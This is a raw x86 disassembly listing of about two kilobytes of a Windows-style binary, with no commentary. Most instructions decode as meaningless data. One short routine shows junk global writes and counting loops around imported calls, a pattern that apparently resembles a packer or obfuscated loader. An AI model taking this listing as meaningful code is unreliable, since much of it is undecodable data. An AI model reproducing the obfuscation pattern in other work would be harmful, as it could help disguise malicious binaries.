  40d2b4:	out    dx,eax
  40d2b5:	sahf   
  40d2b6:	mov    ecx,0xdf053803
  40d2bb:	ret    0xbc07
  40d2be:	cmp    ebp,esi
  40d2c0:	call   0x39b0:0xdda5b0f1
  40d2c7:	lds    edi,FWORD PTR [eax+esi*2-0x1a]
  40d2cb:	inc    edi
  40d2cc:	stos   DWORD PTR es:[edi],eax
  40d2cd:	pop    edx
  40d2ce:	inc    esp
  40d2cf:	aas    
  40d2d0:	inc    ebx
  40d2d1:	int3   
  40d2d2:	imul   ebp,DWORD PTR [esi-0x222d805b],0x12
  40d2d9:	cmp    edi,DWORD PTR [ebx]
  40d2db:	repnz test DWORD PTR [ecx-0x343a97bf],edi
  40d2e2:	cmovno eax,DWORD PTR [ecx+edx*4]
  40d2e6:	out    0x6d,eax
  40d2e8:	leave  
  40d2e9:	ret    0x2e18
  40d2ec:	jg     0x40d342
  40d2ee:	cmp    al,0x33
  40d2f0:	or     DWORD PTR [eax-0x4ebe8818],ebp
  40d2f6:	daa    
  40d2f7:	pop    ds
  40d2f8:	push   ecx
  40d2f9:	jmp    0xcf7b59b6
  40d2fe:	mov    dl,0x79
  40d300:	lea    esp,[esi]
  40d302:	cmp    al,0xbe
  40d304:	mov    dl,0x3f
  40d306:	ins    DWORD PTR es:[edi],dx
  40d307:	mov    bl,0xf2
  40d309:	int3   
  40d30a:	in     al,dx
  40d30b:	xchg   edx,eax
  40d30c:	xchg   BYTE PTR [edx+0x17],dh
  40d30f:	nop
  40d310:	aam    0x6b
  40d312:	xchg   ebp,eax
  40d313:	retf   
  40d314:	out    dx,eax
  40d315:	mov    DWORD PTR [esi-0xfa96ff9],esi
  40d31b:	cwde   
  40d31c:	dec    ebx
  40d31d:	test   eax,0x506915d1
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	fmul   DWORD PTR [ebx-0x70]
  40d33b:	dec    ebx
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	loop   0x40d33e
  40d346:	mov    ah,BYTE PTR [ebx+0x6]
  40d349:	in     al,0xe8
  40d34b:	dec    ebp
  40d34c:	xchg   DWORD PTR [edx-0x22],esp
  40d34f:	mov    esi,0x3ae7a7e7
  40d354:	mov    edi,0xc98e9bd6
  40d359:	sar    DWORD PTR [ebx+0x15d83991],0xbe
  40d360:	push   ds
  40d361:	dec    esi
  40d362:	xor    eax,edx
  40d364:	mov    BYTE PTR [edx-0xe34be24],dl
  40d36a:	popa   
  40d36b:	mov    dh,0xe4
  40d36d:	pusha  
  40d36e:	sub    bh,ah
  40d370:	and    al,0x78
  40d372:	or     al,0x9
  40d374:	jp     0x40d353
  40d376:	cs cmp bl,dh
  40d379:	mov    ebp,0x9fa5ecad
  40d37e:	into   
  40d37f:	lods   eax,DWORD PTR ds:[esi]
  40d380:	or     eax,0x9e2d58f6
  40d385:	cmc    
  40d386:	scas   eax,DWORD PTR es:[edi]
  40d387:	ret    
  40d388:	pop    eax
  40d38a:	and    al,0xe1
  40d38c:	int    0xab
  40d38e:	push   0xffffffe9
  40d390:	jle    0x40d381
  40d392:	jo     0x40d411
  40d394:	xchg   DWORD PTR [edx+0x5c7012d9],ebx
  40d39a:	xor    al,0x4d
  40d39c:	cli    
  40d39d:	mov    al,cl
  40d39f:	fist   DWORD PTR [edi]
  40d3a1:	xor    cl,BYTE PTR [ebp+0x4abfe198]
  40d3a7:	jo     0x40d3c6
  40d3a9:	loope  0x40d3f3
  40d3ab:	mov    ds:0x7ef65a80,al
  40d3b0:	inc    edi
  40d3b1:	test   eax,0x1bcc5471
  40d3b6:	adc    eax,0x9be0d876
  40d3bb:	fbstp  TBYTE PTR [edx+0x3dc8f22]
  40d3c1:	sub    al,0xd1
  40d3c3:	mov    eax,ds:0x60c956d1
  40d3c8:	jb     0x40d445
  40d3ca:	stos   BYTE PTR es:[edi],al
  40d3cb:	mov    dh,0x8d
  40d3cd:	pop    ds
  40d3ce:	inc    esi
  40d3cf:	xchg   BYTE PTR [edi+0x2c997d59],bh
  40d3d5:	loope  0x40d38e
  40d3d7:	cli    
  40d3d8:	push   ebx
  40d3d9:	xchg   ebp,eax
  40d3da:	rol    BYTE PTR [edx+0x51],1
  40d3dd:	aad    0xf9
  40d3df:	aad    0x66
  40d3e1:	jb     0x40d369
  40d3e3:	cs or  ebp,esp
  40d3e6:	sub    BYTE PTR ds:0x8fd50136,0xff
  40d3ed:	int3   
  40d3ee:	mov    ah,0xd4
  40d3f0:	jno    0x40d3e3
  40d3f2:	mov    bh,0x1e
  40d3f4:	nop    DWORD PTR [esi-0x3a]
  40d3f8:	push   edx
  40d3f9:	mov    cl,bh
  40d3fb:	pop    ds
  40d3fc:	sar    BYTE PTR [eax+0x288cc1f7],0x2b
  40d403:	mov    dh,0x2d
  40d405:	fimul  DWORD PTR [ecx+0x2e]
  40d408:	(bad)  
  40d409:	sbb    al,bh
  40d40b:	je     0x40d45e
  40d40d:	ficom  WORD PTR [ecx-0x5e]
  40d410:	mov    edx,0x93fc3543
  40d415:	cmp    bh,bh
  40d417:	sub    edx,DWORD PTR [edx-0x4423f903]
  40d41d:	or     eax,edi
  40d41f:	scas   eax,DWORD PTR es:[edi]
  40d420:	or     eax,0x67c30676
  40d425:	pop    es
  40d426:	pop    ebx
  40d427:	mov    ch,0x8f
  40d429:	fisubr DWORD PTR [ebx]
  40d42b:	or     eax,0x52241dce
  40d430:	inc    bx
  40d432:	push   0xf7eee668
  40d437:	cmp    edx,edx
  40d439:	pop    ebx
  40d43a:	jp     0x40d3ec
  40d43c:	fisub  WORD PTR [eax]
  40d43e:	into   
  40d43f:	js     0x40d438
  40d441:	mov    ebp,0x76a2f05d
  40d446:	call   FWORD PTR [esi-0x5ac0b79a]
  40d44c:	adc    al,0x1d
  40d44e:	sbb    al,0xa6
  40d450:	mov    edx,0x59deaf0e
  40d455:	sub    al,0x1c
  40d457:	lahf   
  40d458:	cmp    eax,esp
  40d45a:	jne    0x40d421
  40d45c:	push   0xd80f4b5a
  40d461:	mov    dl,0x50
  40d463:	(bad)  
  40d464:	sub    bh,bh
  40d466:	cld    
  40d467:	fild   WORD PTR [edx+0x1]
  40d46a:	sahf   
  40d46b:	dec    esp
  40d46c:	cli    
  40d46d:	adc    esp,DWORD PTR [edi+0x5ee8c2]
  40d473:	jmp    0x11cf:0x4327f89
  40d47a:	or     eax,esp
  40d47c:	jg     0x40d49b
  40d47e:	lods   al,BYTE PTR ds:[esi]
  40d47f:	(bad)  
  40d480:	js     0x40d478
  40d482:	xchg   bl,bl
  40d484:	dec    edx
  40d485:	dec    edi
  40d486:	jle    0x40d4d1
  40d488:	je     0x40d4c7
  40d48a:	inc    edi
  40d48b:	push   cs
  40d48c:	scas   eax,DWORD PTR es:[edi]
  40d48d:	sbb    bh,BYTE PTR [ebp-0x5f]
  40d490:	mov    BYTE PTR [ecx+0x20],al
  40d493:	mov    ch,0x11
  40d495:	test   DWORD PTR [edx],0x64904f43
  40d49b:	aas    
  40d49c:	pop    ds
  40d49d:	cmp    al,0x11
  40d49f:	add    eax,0x4cb4db37
  40d4a4:	sub    eax,0x57810e86
  40d4a9:	loop   0x40d4b7
  40d4ab:	(bad)  
  40d4ac:	cmc    
  40d4ad:	addr16 loopne 0x40d459
  40d4b0:	retf   0x4d76
  40d4b3:	mov    dh,0xc5
  40d4b5:	mov    dh,0xc1
  40d4b7:	jbe    0x40d51f
  40d4b9:	mov    bl,0x97
  40d4bb:	(bad)  
  40d4bc:	js     0x40d515
  40d4be:	icebp  
  40d4bf:	mov    ?,WORD PTR [edx]
  40d4c1:	fdivr  st,st(3)
  40d4c3:	sub    dh,BYTE PTR [ebx+0x5d]
  40d4c6:	leave  
  40d4c7:	faddp  st(2),st
  40d4c9:	out    0x54,al
  40d4cb:	pop    ebp
  40d4cc:	mov    ds:0x83836447,al
  40d4d1:	inc    esi
  40d4d2:	sub    al,0x43
  40d4d4:	ins    BYTE PTR es:[edi],dx
  40d4d5:	push   edx
  40d4d6:	lock pop edi
  40d4d8:	pop    edx
  40d4d9:	mov    DWORD PTR [ecx],ebx
  40d4db:	fidiv  WORD PTR [esi]
  40d4dd:	push   edi
  40d4de:	(bad)  
  40d4df:	push   ds
  40d4e0:	adc    edx,DWORD PTR [eax-0xe08cfab]
  40d4e6:	sahf   
  40d4e7:	je     0x40d543
  40d4e9:	jmp    0x6955:0x107f87b0
  40d4f0:	(bad)  
  40d4f1:	retf   
  40d4f2:	fs xor eax,0xae25b0e4
  40d4f8:	jge    0x40d578
  40d4fa:	daa    
  40d4fb:	add    DWORD PTR [ecx-0x6ec84407],0x4e
  40d502:	adc    al,0x2d
  40d504:	(bad)
  40d507:	sti    
  40d508:	jne    0x40d57e
  40d50a:	or     cl,BYTE PTR [eax+0x4f]
  40d50d:	retf   
  40d50e:	or     ebx,DWORD PTR [ebp+0x3d]
  40d511:	cdq    
  40d512:	cmp    bh,bl
  40d514:	push   esp
  40d515:	adc    al,0x27
  40d517:	test   eax,0x14f9a3b1
  40d51c:	or     DWORD PTR [esi],0x449709aa
  40d522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d523:	clc    
  40d524:	addr16 mov cl,0x95
  40d527:	jne    0x40d527
  40d529:	and    eax,0x4f7fbf6a
  40d52e:	and    al,0xe4
  40d530:	jp     0x40d503
  40d532:	arpl   WORD PTR [eax],cx
  40d534:	lods   al,BYTE PTR ds:[esi]
  40d535:	push   es
  40d536:	int3   
  40d537:	push   cs
  40d538:	mov    al,0x7c
  40d53a:	push   es
  40d53b:	popf   
  40d53c:	ins    DWORD PTR es:[edi],dx
  40d53d:	outs   dx,BYTE PTR ds:[esi]
  40d53e:	je     0x40d56f
  40d540:	into   
  40d541:	sub    BYTE PTR [edx-0x17],cl
  40d544:	ror    ah,cl
  40d546:	addr16 aaa 
  40d548:	int    0x3e
  40d54a:	rcr    BYTE PTR [ebp-0x1ee72d1],1
  40d550:	jmp    0x40d5ce
  40d552:	cmp    BYTE PTR [ebp-0x78],ah
  40d555:	into   
  40d556:	(bad)  
  40d557:	gs cs pop esi
  40d55a:	sub    esp,esp
  40d55c:	popa   
  40d55d:	(bad)  
  40d55f:	jp     0x40d554
  40d561:	js     0x40d5be
  40d563:	xchg   DWORD PTR ds:0xa5982b04,ebx
  40d569:	iret   
  40d56a:	shl    BYTE PTR ds:0xb2040785,1
  40d570:	inc    edx
  40d571:	or     bl,cl
  40d573:	push   ds
  40d574:	bound  ecx,QWORD PTR [ecx+0x67]
  40d577:	cmc    
  40d578:	mov    DWORD PTR [esi],ecx
  40d57a:	out    dx,eax
  40d57b:	push   0xffffffe6
  40d57d:	cs inc ebx
  40d57f:	push   cs
  40d580:	pop    edx
  40d581:	or     al,0x74
  40d583:	nop
  40d584:	xor    ah,BYTE PTR [ebx]
  40d586:	add    ch,BYTE PTR [ebp+0x3438a3e]
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x13a0482a
  40d6f9:	push   esi
  40d6fa:	push   ss
  40d6fb:	retf   
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6c9
  40d705:	jae    0x40d74a
  40d707:	jnp    0x40d6bd
  40d709:	shl    BYTE PTR [esi+esi*2-0x58],cl
  40d70d:	shr    DWORD PTR [eax-0x36],0xf4
  40d711:	adc    ch,dl
  40d713:	inc    DWORD PTR [ebx+0x56]
  40d716:	int    0x72
  40d718:	mov    cl,0x60
  40d71a:	arpl   WORD PTR [ebp+0x69],di
  40d71d:	adc    edi,ebx
  40d71f:	je     0x40d77f
  40d721:	fnstenv [edi]
  40d723:	rol    DWORD PTR ds:0x31ca6893,1
  40d729:	ins    BYTE PTR es:[edi],dx
  40d72a:	inc    edi
  40d72b:	xchg   ebp,eax
  40d72c:	lock mov al,BYTE PTR [esi+0x34]
  40d730:	mov    edx,0x80a3b241
  40d735:	js     0x40d7b5
  40d737:	loope  0x40d740
  40d739:	pop    esp
  40d73a:	inc    ecx
  40d73b:	adc    eax,0x8416dd57
  40d740:	lods   eax,DWORD PTR ds:[esi]
  40d741:	stc    
  40d742:	in     al,0xee
  40d744:	mov    ecx,0xeed3cdf0
  40d749:	fucomi st,st(1)
  40d74b:	loopne 0x40d779
  40d74d:	jns    0x40d795
  40d74f:	test   BYTE PTR [ecx+eiz*2],0x2a
  40d753:	fcmovnu st,st(4)
  40d755:	sbb    DWORD PTR [ebx+0x39],edi
  40d758:	jo     0x40d739
  40d75a:	dec    edi
  40d75b:	loopne 0x40d721
  40d75d:	idiv   esp
  40d75f:	jle    0x40d723
  40d761:	mov    dh,0x2f
  40d763:	and    DWORD PTR [eax+0x42],eax
  40d766:	mov    al,ds:0x77408c57
  40d76b:	sub    ch,BYTE PTR [edi+0x2f]
  40d76e:	je     0x40d703
  40d770:	push   ebx
  40d771:	cmp    BYTE PTR es:[edi],ch
  40d774:	retf   0x51a2
  40d777:	(bad)  [esi]
  40d779:	mov    edx,0x3fd5d29b
  40d77e:	jnp    0x40d719
  40d780:	xchg   ecx,eax
  40d781:	enter  0xa348,0x14
  40d785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d786:	or     al,BYTE PTR [ebx-0x1553ab47]
  40d78c:	repz adc DWORD PTR [ebx-0x27d21aaa],edx
  40d793:	adc    al,BYTE PTR [edx+0x2fcd8a11]
  40d799:	and    BYTE PTR ds:0xd1effc75,cl
  40d79f:	mov    eax,0xc87d663f
  40d7a4:	and    eax,0x78cf0dca
  40d7a9:	jge    0x40d78f
  40d7ab:	sub    BYTE PTR [eax+eax*1-0x18ffb407],0x20
  40d7b3:	jg     0x40d77f
  40d7b5:	jae    0x40d7f6
  40d7b7:	push   edx
  40d7b8:	imul   eax,DWORD PTR [edi+0xa],0x4d78aec2
  40d7bf:	mov    bh,0x2
  40d7c1:	pop    esp
  40d7c2:	push   ss
  40d7c3:	pushf  
  40d7c4:	inc    edi
  40d7c5:	or     DWORD PTR [edx+ebx*1+0x7b0e62a0],esi
  40d7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7ce:	push   esp
  40d7cf:	sbb    BYTE PTR [edi],bh
  40d7d1:	sar    DWORD PTR [eax],0xf3
  40d7d4:	dec    ecx
  40d7d5:	push   eax
  40d7d6:	adc    BYTE PTR [edx-0x5112d816],0x86
  40d7dd:	or     BYTE PTR [eax],dl
  40d7df:	xchg   dx,ax
  40d7e1:	sbb    al,bh
  40d7e3:	call   0x91d54042
  40d7e8:	jge    0x40d7c4
  40d7ea:	sar    al,0xd5
  40d7ed:	jp     0x40d816
  40d7ef:	arpl   si,sp
  40d7f1:	mov    WORD PTR [ebx+ebx*2-0x2fba7b9f],?
  40d7f8:	fadd   QWORD PTR [edi+0x26]
  40d7fb:	push   es
  40d7fc:	mov    ds:0xd551422f,eax
  40d801:	inc    eax
  40d802:	(bad)  
  40d803:	mov    eax,ds:0x3edbf588
  40d808:	pop    esi
  40d809:	mov    eax,0xcf5a6eb1
  40d80e:	outs   dx,BYTE PTR ds:[esi]
  40d80f:	test   BYTE PTR [eax+edx*8+0x51e158a8],bh
  40d816:	rol    BYTE PTR [eax+0x10],0x81
  40d81a:	jmp    0xbe81:0xd72cf75b
  40d821:	call   0x46:0x3d8cff28
  40d828:	dec    ebx
  40d829:	pop    esi
  40d82a:	inc    edx
  40d82b:	(bad)  
  40d82c:	or     DWORD PTR fs:[edi+0x4f],esi
  40d830:	and    BYTE PTR [eax-0x1d39c012],al
  40d836:	push   edi
  40d837:	mov    eax,0x57ae48b9
  40d83c:	scas   eax,DWORD PTR es:[edi]
  40d83d:	and    BYTE PTR [ebp-0x7],bl
  40d840:	mov    dh,0x3b
  40d842:	or     ebp,DWORD PTR es:[esi-0x363d6ea2]
  40d849:	lahf   
  40d84a:	push   eax
  40d84b:	out    dx,al
  40d84c:	sub    al,0xf5
  40d84e:	jg     0x40d8a5
  40d850:	pop    edi
  40d851:	pop    ecx
  40d852:	(bad)  
  40d853:	sbb    eax,0xd834517f
  40d858:	cld    
  40d859:	stos   BYTE PTR es:[edi],al
  40d85a:	mov    ds:0x1f5fe6e4,eax
  40d85f:	add    al,0x17
  40d861:	clc    
  40d862:	or     al,0x27
  40d864:	xchg   ecx,eax
  40d865:	or     al,0xb3
  40d867:	std    
  40d868:	jb     0x40d8de
  40d86a:	xchg   BYTE PTR [eax+0x444a9e22],ah
  40d870:	or     BYTE PTR [ebp-0x2e],0xb7
  40d874:	mov    ebp,0x9e20f7b5
  40d879:	scas   al,BYTE PTR es:[edi]
  40d87a:	adc    BYTE PTR [edx-0x50],dl
  40d87d:	add    bh,dh
  40d87f:	ins    BYTE PTR es:[edi],dx
  40d880:	test   DWORD PTR [edi+0x4d8a75ac],ebp
  40d886:	xchg   esp,eax
  40d887:	fs shr dh,0x5f
  40d88b:	sar    DWORD PTR [ebx-0x4773a4c3],0x5e
  40d892:	inc    edx
  40d893:	or     esi,DWORD PTR [ebp-0x49]
  40d896:	int    0x6a
  40d898:	int    0x20
  40d89a:	pop    ss
  40d89b:	mov    bl,0x11
  40d89d:	enter  0xd541,0x65
  40d8a1:	repnz std 
  40d8a3:	pop    esp
  40d8a4:	scas   eax,DWORD PTR es:[edi]
  40d8a5:	(bad)  
  40d8a6:	sbb    al,0xbe
  40d8a8:	dec    esi
  40d8a9:	cmovbe eax,DWORD PTR [esi-0x59]
  40d8ad:	in     eax,dx
  40d8ae:	push   esp
  40d8af:	add    esi,DWORD PTR [esi+0x3]
  40d8b2:	xor    DWORD PTR [esi-0x45],edi
  40d8b5:	sbb    dh,bh
  40d8b7:	dec    ecx
  40d8b8:	push   edi
  40d8b9:	data16 add al,0xc3
  40d8bc:	or     DWORD PTR [ebx+0x54c52af7],edx
  40d8c2:	mov    eax,0xab987ffd
  40d8c7:	add    al,0x44
  40d8c9:	sahf   
  40d8ca:	adc    edx,ebx
  40d8cc:	dec    DWORD PTR [edx+0x37c4ccf4]
  40d8d2:	mov    ch,0xb5
  40d8d4:	mov    ch,0x34
  40d8d6:	pop    ebx
  40d8d7:	in     eax,0x4d
  40d8d9:	imul   ebp,DWORD PTR [eax],0xffffffda
  40d8dc:	ins    BYTE PTR es:[edi],dx
  40d8dd:	mov    ds:0xb085397f,eax
  40d8e2:	mov    esp,0x271d1fda
  40d8e7:	dec    ebx
  40d8e8:	mov    eax,0xaac3e0b5
  40d8ed:	inc    esi
  40d8ee:	fwait
  40d8ef:	sub    al,0xf6
  40d8f1:	mov    bh,0xb8
  40d8f3:	dec    esi
  40d8f4:	sar    BYTE PTR [ecx-0x4430a0d6],1
  40d8fa:	popf   
  40d8fb:	test   dh,cl
  40d8fd:	xor    eax,0xa0ce5236
  40d902:	adc    DWORD PTR [edx-0x4c1c9395],esi
  40d908:	out    dx,eax
  40d909:	push   cs
  40d90a:	out    0x3a,eax
  40d90c:	mov    BYTE PTR [ebp+0x2841aea3],bl
  40d912:	xchg   bl,cl
  40d914:	sahf   
  40d915:	mov    edx,0x3b20ab52
  40d91b:	sti    
  40d91c:	jle    0x40d8db
  40d91e:	ret    0x5326
  40d921:	mov    al,0xfc
  40d923:	in     al,dx
  40d924:	xchg   ebp,eax
  40d925:	out    dx,al
  40d926:	fs jp  0x40d8e6
  40d929:	dec    ebp
  40d92a:	cld    
  40d92b:	push   esi
  40d92c:	jbe    0x40d97c
  40d92e:	nop
  40d92f:	dec    cl
  40d931:	mov    al,0x76
  40d933:	jo     0x40d9a2
  40d935:	and    dl,BYTE PTR [edx+0x54]
  40d938:	fcomp  st(2)
  40d93a:	stc    
  40d93b:	dec    ebp
  40d93c:	pop    edx
  40d93d:	mov    ebx,0x6fc980e4
  40d942:	fwait
  40d943:	add    al,0x89
  40d945:	add    DWORD PTR [ebx-0xd1607bb],ecx
  40d94b:	add    al,0x0
  40d94d:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40d953:	adc    BYTE PTR [ebx],dh
  40d955:	mov    DWORD PTR [ebx],0x258e9c6
  40d95b:	add    BYTE PTR [eax],al
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x442b51ed
  40d96a:	imul   ebp
  40d96c:	cmp    DWORD PTR [edx],edi
  40d96e:	nop
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d9e2
  40d976:	xchg   esp,eax
  40d977:	lea    esp,ds:0xb72b8c0f
  40d97d:	(bad)  
  40d97e:	push   0x1b
  40d980:	enter  0x28a3,0xbf
  40d984:	mov    BYTE PTR [esi],dl
  40d986:	and    DWORD PTR [ebx+edi*8],edx
  40d989:	or     eax,0xae7d582a
  40d98e:	ins    BYTE PTR es:[edi],dx
  40d98f:	repnz loop 0x40d9e9
  40d992:	and    DWORD PTR [edi],0x36
  40d995:	push   ebx
  40d996:	push   ss
  40d997:	cwde   
  40d998:	out    0xad,al
  40d99a:	imul   esp,DWORD PTR [edi+eiz*1+0x6efa3b9a],0xb5006be8
  40d9a5:	sbb    DWORD PTR [esi],ebx
  40d9a7:	xchg   ebx,eax
  40d9a8:	or     BYTE PTR [eax],bh
  40d9aa:	cmc    
  40d9ab:	ret    0x1bab
  40d9ae:	jmp    DWORD PTR [ecx-0x27a621a6]
  40d9b4:	sbb    bh,dh
  40d9b6:	adc    DWORD PTR [esi],0x77acaba1
  40d9bc:	dec    esi
  40d9bd:	jecxz  0x40d950
  40d9bf:	sub    al,0xde
  40d9c1:	cli    
  40d9c2:	div    BYTE PTR [ebx+ecx*1]
  40d9c5:	xchg   edx,eax
  40d9c6:	inc    ebx
  40d9c7:	mov    ebx,ebp
  40d9c9:	push   ebp
  40d9ca:	mov    ds:0x5d94e842,al
  40d9cf:	test   al,0x73
  40d9d1:	or     eax,0xd3298c1e
  40d9d6:	ins    DWORD PTR es:[edi],dx
  40d9d7:	jns    0x40da2c
  40d9d9:	pop    ebx
  40d9da:	adc    BYTE PTR [ecx],cl
  40d9dc:	test   al,0x45
  40d9de:	jmp    0x43f0:0x2542ddff
  40d9e5:	(bad)  [ecx+0x60f79d24]
  40d9eb:	or     BYTE PTR [eax-0x12ecd3e0],0x44
  40d9f2:	clc    
  40d9f3:	addr16 call 0x16dd:0xa6365bfa
  40d9fb:	je     0x40d9bd
  40d9fd:	dec    esi
  40d9fe:	jbe    0x40d98e
  40da00:	(bad)  
  40da01:	xchg   esi,eax
  40da02:	fist   DWORD PTR [edx-0x36e32da7]
  40da08:	xor    eax,0x687f1ea5
  40da0d:	adc    al,dl
  40da0f:	cs jmp 0xa949cda
  40da15:	push   esi
  40da16:	repnz sub ebp,edx
  40da19:	or     BYTE PTR [edi+0x28],dl
  40da1c:	stos   DWORD PTR es:[edi],eax
  40da1d:	in     eax,0xa7
  40da1f:	ins    BYTE PTR es:[edi],dx
  40da20:	xchg   esp,eax
  40da21:	xchg   edx,eax
  40da22:	int3   
  40da23:	xor    eax,0x77486a95
  40da28:	out    0x81,al
  40da2a:	sbb    edx,esi
  40da2c:	pusha  
  40da2d:	icebp  
  40da2e:	cld    
  40da2f:	fcom   QWORD PTR ds:0x7c329e42
  40da35:	data16 std 
  40da37:	dec    edx
  40da38:	imul   esp,DWORD PTR [ecx],0x6212c69a
  40da3e:	jne    0x40da9b
  40da40:	in     al,dx
  40da41:	mov    ebx,0xdc5156a1
  40da46:	mov    ebp,0xcc096838
  40da4b:	fiadd  DWORD PTR [ebp+0x53]
  40da4e:	push   ebp
  40da4f:	sbb    eax,DWORD PTR [ecx-0x59afd5cf]
  40da55:	sbb    bh,dh
  40da57:	inc    edi
  40da58:	fistp  DWORD PTR [edx]
  40da5a:	jg     0x40da46
  40da5c:	mov    ss,WORD PTR [edi+0x5c0e1c02]
  40da62:	mov    edi,0x6d89c5f2
  40da67:	sti    
  40da68:	jo     0x40da5b
  40da6a:	test   BYTE PTR [ecx],ah
  40da6c:	sbb    eax,0xac19ccd3
  40da71:	or     edi,0x56
  40da74:	push   eax
  40da75:	or     ecx,edx
  40da77:	popf   
  40da78:	(bad)  
  40da7a:	ins    BYTE PTR es:[edi],dx
  40da7b:	sahf   
  40da7c:	fwait
  40da7d:	mov    ecx,gs
  40da7f:	mov    esi,0x1d7563f6
  40da84:	pop    eax
  40da85:	sbb    DWORD PTR [eax-0x182f240e],ecx
  40da8b:	dec    esp
  40da8c:	sbb    BYTE PTR [edi+esi*8+0x658fc41e],dl
  40da93:	push   ecx
  40da94:	adc    BYTE PTR [edi-0x58],bh
  40da97:	dec    esi
  40da98:	or     esi,edx
  40da9a:	cli    
  40da9b:	in     al,0x84
  40da9d:	push   0xffffff9c
  40da9f:	fcomp  QWORD PTR [ecx+0x43c5a12f]
  40daa5:	repnz ins DWORD PTR es:[edi],dx
  40daa7:	sub    bh,dl
  40daa9:	pop    ebp
  40daaa:	fwait
  40daab:	mov    al,ds:0xcd79fd2e
  40dab0:	not    dl
  40dab2:	xor    bh,cl
  40dab4:	out    dx,al
  40dab5:	or     BYTE PTR [ebp+0x2d643996],al
  40dabb:	add    eax,DWORD PTR [edi-0x6807b10e]
  40dac1:	and    cl,ch
  40dac3:	xor    esi,DWORD PTR [ebp-0x5f]
  40dac6:	gs in  eax,dx
  40dac8:	jp     0x40dab5
  40daca:	(bad)  
  40dacb:	fsub   QWORD PTR [edi+0x33]
  40dace:	cmp    eax,0x452b07b8
  40dad3:	xchg   BYTE PTR [esi-0x2236fc61],al
  40dad9:	push   ds
  40dada:	mov    bh,0x26
  40dadc:	cs in  al,0x3b
  40dadf:	cmp    cl,BYTE PTR [edx+eiz*1]
  40dae2:	sbb    eax,0xa22af97f
  40dae7:	xchg   edx,eax
  40dae8:	sbb    DWORD PTR [eax-0x68],edx
  40daeb:	push   esi
  40daec:	sub    eax,0x2787a548
  40daf1:	pop    ss
  40daf2:	mov    edi,DWORD PTR ds:0x4d9553ea
